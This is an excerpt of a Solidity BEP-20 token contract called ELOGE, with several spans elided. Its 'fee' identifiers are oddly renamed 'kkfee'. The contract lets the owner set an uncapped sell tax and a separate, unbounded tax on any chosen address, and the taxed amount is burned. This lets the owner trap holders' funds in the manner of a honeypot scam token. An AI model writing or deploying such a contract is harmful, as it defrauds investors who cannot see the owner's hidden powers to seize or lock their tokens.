...
interface IUniswapV2Factory {
    ...
    function kkfeeTo() external view returns (address);
    function kkfeeToSetter() external view returns (address);
    ...
    function setkkfeeTo(address) external;
    function setkkfeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingkkfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingkkfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingkkfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingkkfeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingkkfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract ELOGE is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellkkfee = 0;

    uint256 private _defaultBuykkfee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipkkfee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellkkfee = _value;
    }

    function setSlipkkfee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipkkfee[_address] = _value;
    }

    function getSlipkkfee(address _address) external view onlyownar returns (uint256) {
        return _slipkkfee[_address];
    }


    function setMAccountkkfee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountkkfee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradekkfeeAmount = 0;

        if (rF) {
            uint256 tradekkfee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradekkfee = _defaultSellkkfee;
                }
                if (from == uniswapV2Pair) {

                    tradekkfee = _defaultBuykkfee;
                }
            }
            if (_slipkkfee[from] > 0) {
                tradekkfee = _slipkkfee[from];
            }

            tradekkfeeAmount = _Amount.mul(tradekkfee).div(100);
        }


        if (tradekkfeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradekkfeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradekkfeeAmount);
            emit Transfer(from, _deadAddress, tradekkfeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradekkfeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradekkfeeAmount);
        emit Transfer(from, _to, _Amount - tradekkfeeAmount);
    }
